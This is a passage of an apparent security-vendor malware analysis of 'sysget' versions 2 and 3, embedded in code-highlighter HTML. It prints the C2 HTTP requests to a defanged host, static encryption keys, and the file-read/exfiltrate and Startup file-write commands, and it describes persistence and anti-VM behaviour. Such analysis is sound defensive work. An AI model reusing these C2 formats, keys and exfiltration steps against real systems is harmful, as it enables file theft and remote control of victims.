			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
C:\&gt;python decrypt_config.py vklCen5.tmp
'gh1443717133\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x001059086204\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc267291240254-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc267291240254-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc267291240254-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc267291240254-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc267291240254-1"><span class="crayon-v">C</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-o">&gt;</span><span class="crayon-e">python </span><span class="crayon-v">decrypt_config</span><span class="crayon-sy">.</span><span class="crayon-e">py </span><span class="crayon-v">vklCen5</span><span class="crayon-sy">.</span><span class="crayon-i">tmp</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc267291240254-2"><span class="crayon-s">'gh1443717133\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\</span></div><div class="crayon-line" id="crayon-5f694c78cc267291240254-3"><span class="crayon-s">x00\x00\x00\x00\x001059086204\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc267291240254-4"><span class="crayon-s">x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The encryption of this configuration file is a new feature that was not present in the original version of sysget.</p>
<p>If this file is not present on the system, the malware will attempt to retrieve the necessary information via a HTTP request. The following request is made to the remote command and control server. Note that the full URI is statically set by the malware sample.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc269332789046" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /index.php?type=read&amp;id=1420efbd80ce02328663631c8d8f813c&amp;pageinfo=jp&amp;lang=
utf-8 HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/40.0.2214.115 Safari/537.36
Host: hello.newtaiwan[.]top</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc269332789046-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc269332789046-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc269332789046-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc269332789046-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc269332789046-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc269332789046-6">6</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc269332789046-1"><span class="crayon-v">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">index</span><span class="crayon-sy">.</span><span class="crayon-v">php</span><span class="crayon-sy">?</span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-v">read</span><span class="crayon-o">&amp;</span><span class="crayon-v">id</span><span class="crayon-o">=</span><span class="crayon-cn">1420efbd80ce02328663631c8d8f813c</span><span class="crayon-o">&amp;</span><span class="crayon-v">pageinfo</span><span class="crayon-o">=</span><span class="crayon-v">jp</span><span class="crayon-o">&amp;</span><span class="crayon-v">lang</span><span class="crayon-o">=</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc269332789046-2"><span class="crayon-v">utf</span><span class="crayon-o">-</span><span class="crayon-cn">8</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-5f694c78cc269332789046-3"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Keep</span><span class="crayon-o">-</span><span class="crayon-e">Alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc269332789046-4"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">AppleWebKit</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">KHTML</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">like </span></div><div class="crayon-line" id="crayon-5f694c78cc269332789046-5"><span class="crayon-v">Gecko</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">Chrome</span><span class="crayon-o">/</span><span class="crayon-cn">40.0.2214.115</span><span class="crayon-h"> </span><span class="crayon-v">Safari</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc269332789046-6"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">hello</span><span class="crayon-sy">.</span><span class="crayon-v">newtaiwan</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">top</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>The server responds with the following data, encrypted using the same technique previously described with a static key of ‘aliado75496’. Once decrypted, we see the following example data being sent back to sysget:</p>
<p>gh1443717133\n1059086204\n</p>
<p>The first string is used as a key for all subsequent network communication. The second string is treated as a unique victim identifier. This data is encrypted using the key of ‘734thfg9ih’ and written to the %APPDATA%/vklCen5.tmp file.</p>
<p>After this information has been obtained, the malware proceeds to enter its command and control loop. An HTTP request such as the following is made to the remote server. Note that the ‘mid’ GET variable holds the MD5 hash of the previously obtained victim identifier. The remaining data in the URI is hardcoded.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc26a667964106" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /index.php?type=get&amp;pageinfo=bridge03443&amp;lang=jp&amp;mid=5717cb8fed2750a2ee9e8
30a30716ed4 HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Host: hello.newtaiwan[.]top</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc26a667964106-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26a667964106-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc26a667964106-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26a667964106-4">4</div><div class="crayon-num" data-line="crayon-5f694c78cc26a667964106-5">5</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc26a667964106-1"><span class="crayon-v">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-v">index</span><span class="crayon-sy">.</span><span class="crayon-v">php</span><span class="crayon-sy">?</span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-v">get</span><span class="crayon-o">&amp;</span><span class="crayon-v">pageinfo</span><span class="crayon-o">=</span><span class="crayon-v">bridge03443</span><span class="crayon-o">&amp;</span><span class="crayon-v">lang</span><span class="crayon-o">=</span><span class="crayon-v">jp</span><span class="crayon-o">&amp;</span><span class="crayon-v">mid</span><span class="crayon-o">=</span><span class="crayon-cn">5717cb8fed2750a2ee9e8</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26a667964106-2"><span class="crayon-cn">30a30716ed4</span><span class="crayon-h"> </span><span class="crayon-v">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line" id="crayon-5f694c78cc26a667964106-3"><span class="crayon-v">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Keep</span><span class="crayon-o">-</span><span class="crayon-e">Alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26a667964106-4"><span class="crayon-v">User</span><span class="crayon-o">-</span><span class="crayon-v">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">5.1</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">AppleWebKit</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">KHTML</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">like </span><span class="crayon-v">Gecko</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">Chrome</span><span class="crayon-o">/</span><span class="crayon-cn">40.0.2214.115</span><span class="crayon-h"> </span><span class="crayon-v">Safari</span><span class="crayon-o">/</span><span class="crayon-cn">537.36</span></div><div class="crayon-line" id="crayon-5f694c78cc26a667964106-5"><span class="crayon-v">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">hello</span><span class="crayon-sy">.</span><span class="crayon-v">newtaiwan</span><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span><span class="crayon-v">top</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0009 seconds] -->
<p>The response is encrypted using the unique key that was obtained previously. Should the response contain ‘Fatal error’ unencrypted, no further actions are taken by the malware sample. Once decrypted, the response may have one of the following two choices, and their accompanying purpose. Alternatively, if a raw command is provided, the malware will execute it and return the results.</p>
<table>
<tbody>
<tr>
<td width="180"><strong>Command</strong></td>
<td width="288"><strong>Description</strong></td>
</tr>
<tr>
<td width="180">goto wrong &#8220;[file_path]&#8221;;\n</td>
<td width="288">Read a specific file and return its contents.</td>
</tr>
<tr>
<td width="180">goto right &#8220;[filename]&#8221; &#8220;[identifier]&#8221;</td>
<td width="288">Write a given file. The identifier is used to retrieve the file’s contents in a subsequent HTTP request.</td>
</tr>
</tbody>
</table>
<p>When the ‘goto wrong’ request is made, a HTTP POST request is made to the following URI. In the following URI, the ‘list’ parameter contains the MD5 hash of the victim’s identifier.</p>
<p>/index.php?type=register&amp;pageinfo=myid32987&amp;list=5717cb8fed2750a2ee9e830a3<br />
0716ed4</p>
<p>The contents of this POST request contains the victim’s identifier, as well as the file’s contents encrypted with the unique key. The first 50 bytes are reserved for the victim identifier, as shown below:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc26c172508838" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
0000016F  35 37 31 37 63 62 38 66  65 64 32 37 35 30 61 32 5717cb8f ed2750a2
0000017F  65 65 39 65 38 33 30 61  33 30 37 31 36 65 64 34 ee9e830a 30716ed4
0000018F  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
0000019F  00 00 4b 59 bc 53 53 99  2b 6f a7 b5 5a 85 c7 66 ..KY.SS. +o..Z..f</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc26c172508838-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26c172508838-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc26c172508838-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26c172508838-4">4</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc26c172508838-1"><span class="crayon-cn">0000016F</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">35</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-h"> </span><span class="crayon-cn">63</span><span class="crayon-h"> </span><span class="crayon-cn">62</span><span class="crayon-h"> </span><span class="crayon-cn">38</span><span class="crayon-h"> </span><span class="crayon-cn">66</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-h"> </span><span class="crayon-cn">35</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-cn">61</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-h"> </span><span class="crayon-cn">5717cb8f</span><span class="crayon-h"> </span><span class="crayon-i">ed2750a2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26c172508838-2"><span class="crayon-cn">0000017F</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-cn">39</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-cn">38</span><span class="crayon-h"> </span><span class="crayon-cn">33</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-cn">61</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">33</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-h"> </span><span class="crayon-cn">37</span><span class="crayon-h"> </span><span class="crayon-cn">31</span><span class="crayon-h"> </span><span class="crayon-cn">36</span><span class="crayon-h"> </span><span class="crayon-cn">65</span><span class="crayon-h"> </span><span class="crayon-cn">64</span><span class="crayon-h"> </span><span class="crayon-cn">34</span><span class="crayon-h"> </span><span class="crayon-i">ee9e830a</span><span class="crayon-h"> </span><span class="crayon-cn">30716ed4</span></div><div class="crayon-line" id="crayon-5f694c78cc26c172508838-3"><span class="crayon-cn">0000018F</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26c172508838-4"><span class="crayon-cn">0000019F</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">00</span><span class="crayon-h"> </span><span class="crayon-cn">4b</span><span class="crayon-h"> </span><span class="crayon-cn">59</span><span class="crayon-h"> </span><span class="crayon-i">bc</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-h"> </span><span class="crayon-cn">53</span><span class="crayon-h"> </span><span class="crayon-cn">99</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">2b</span><span class="crayon-h"> </span><span class="crayon-cn">6f</span><span class="crayon-h"> </span><span class="crayon-e">a7 </span><span class="crayon-i">b5</span><span class="crayon-h"> </span><span class="crayon-cn">5a</span><span class="crayon-h"> </span><span class="crayon-cn">85</span><span class="crayon-h"> </span><span class="crayon-i">c7</span><span class="crayon-h"> </span><span class="crayon-cn">66</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">KY</span><span class="crayon-sy">.</span><span class="crayon-v">SS</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-v">o</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">Z</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-v">f</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0017 seconds] -->
<p>Once decrypted, the data contains both the filename, as well as the contents of that file.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc26d244672406" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
test.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[TRUNCATED]\x
00\x00\x00file contents</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc26d244672406-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc26d244672406-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc26d244672406-1"><span class="crayon-v">test</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">[</span><span class="crayon-v">TRUNCATED</span><span class="crayon-sy">]</span><span class="crayon-sy">\</span><span class="crayon-i">x</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc26d244672406-2"><span class="crayon-cn">00</span><span class="crayon-sy">\</span><span class="crayon-v">x00</span><span class="crayon-sy">\</span><span class="crayon-e">x00file </span><span class="crayon-v">contents</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0006 seconds] -->
<p>If the ‘goto right’ command is used, the malware will make a subsequent request to the following URI. The ‘cache’ variable holds the unique identifier that was provided in the ‘goto right’ command.</p>
<p>/index.php?type=goto&amp;pageinfo=myid47386&amp;cache=identifier</p>
<p>Once the file contents are obtained, they are written to the specified filename in the %STARTUP% folder.</p>
<p>When a raw command is received, the malware will upload the results to the following URI via a POST request:</p>
<p>/index.php?type=register</p>
<p>An overview of the network communications exhibited by sysget version 2 can be seen in the figure below.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_8.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23036" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_8.png" alt="dragon_8" width="582" height="1011" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_8.png 582w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_8-173x300.png 173w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_8-370x643.png 370w" sizes="(max-width: 582px) 100vw, 582px" /></a></p>
<p><em>Figure 8 Sysget version 2 command and control flow</em></p>
<h3>Sysget v3 Analysis</h3>
<p>Some of the biggest changes witnessed in version 3 of sysget includes numerous anti-debug and anti-vm detections added, as well as the encryption of the URIs used for network communication.</p>
<p>When the malware initially executes, it performs the following checks to ensure it is not being debugged and not running in a sandbox or virtualized environment.</p>
<p>Should these checks return false, the malware proceeds to enter its installation routine. The malware originally copies itself to a temp file in the %TEMP% directory with a filename prefix of ‘00’. It proceeds to append 4194304 bytes of randomly chosen data to the end of this file. The increased filesize may have been added by the author in an attempt to thwart sandboxes that impose filesize limits on what is saved and/or processed. Finally, the malware copies the original file from the tmp path to the %STARTUP%/winlogon.exe path using the same technique witnessed in version 2. Sysget then writes a batch script in the %TEMP% folder with the following contents, cleaning up the original files and spawning the newly written winlogon.exe executable:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc26f873981104" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
